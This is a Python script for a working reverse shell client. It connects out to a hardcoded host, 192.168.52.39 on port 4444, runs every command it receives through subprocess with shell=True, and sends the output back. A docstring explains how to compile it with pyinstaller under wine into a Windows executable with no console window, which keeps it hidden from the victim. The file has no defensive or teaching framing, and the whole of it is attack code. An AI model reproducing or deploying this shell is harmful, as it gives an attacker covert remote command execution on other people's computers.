#!/usr/bin/env python3 

'''

In order to convert the shell to an exe, wine needs to be installed and the following
command must be run:
sudo wine /root/.wine/drive_c/Python3/Scripts/pyinstaller.exe --onefile --noconsole shell.py 

'''

import socket
import subprocess
import json
import os
import base64

def sendJSON(data):

    jsonData = json.dumps(data)
    jsonData = jsonData.encode()
    sock.send(jsonData)

def receiveJSON():

    data = ''

    while True:

        try:
            
            command = sock.recv(1024)
            command = command.decode('utf-8')
            data = data + command 
            return json.loads(data)

        except ValueError:
            continue

def shell():

    while True:
        command = receiveJSON()

        if command == 'exit':
            break

        elif command[:2] == 'cd' and len(command) > 1:

            try:
                os.chdir(command[3:])
            except:
                continue

        else:

            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = process.stdout.read() + process.stderr.read()
            sendJSON(result.decode())

def main():

    global sock

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('192.168.52.39', 4444))
    
    shell()
    sock.close()
    
main()